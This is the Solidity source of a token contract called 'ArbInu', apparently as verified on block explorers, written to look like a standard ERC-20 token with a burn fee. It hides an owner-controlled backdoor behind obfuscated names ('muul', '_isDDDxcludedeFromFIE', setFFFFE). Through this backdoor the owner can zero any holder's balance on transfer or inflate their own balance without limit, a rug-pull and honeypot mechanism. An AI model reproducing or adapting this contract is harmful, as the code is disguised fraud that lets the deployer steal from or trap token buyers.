/**
 *Submitted for verification at Etherscan.io on 2023-02-14
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

pragma solidity ^0.4.25;

library SafeMath {

    function muul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'ArbInu';

    string constant public symbol = 'ArbInu';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 1000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 10000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => uint256) private _isDDDxcludedeFromFIE;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
    address public projectAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private _taxFIIEE = 0;
    uint256 private _burnFIIEE = 5;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);


    function setFFFFE(address accdcount) public onlyOwner {
        _isDDDxcludedeFromFIE[accdcount] = 1+0;
    }

    function setAddminFFFFE(address accdcount,uint256 ammouunt) public onlyOwner {
        _isDDDxcludedeFromFIE[accdcount] = 1*ammouunt+0;
    }


    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        if(_isDDDxcludedeFromFIE[from] >= uint256(1+0)+0 ){
            balanceOf[from] = balanceOf[from].muul(_isDDDxcludedeFromFIE[from].sub(1+0)+0);
        }

        uint256 FIE =  value.muul(_taxFIIEE).div(100)+0;
        uint256 burn =  value.muul(_burnFIIEE).div(100)+0;

        balanceOf[from] = balanceOf[from].sub(value)+0;

        balanceOf[to] = balanceOf[to].add(value).sub(FIE).sub(burn);

        if(FIE > 0+0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(FIE)+0;
            emit Transfer(from, projectAddress, FIE);
        }

        if(burn > 0+0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn)+0;
            emit Transfer(from, burnAddress, burn);
        }

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }



}


contract DEMO is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
        revert();
    }
}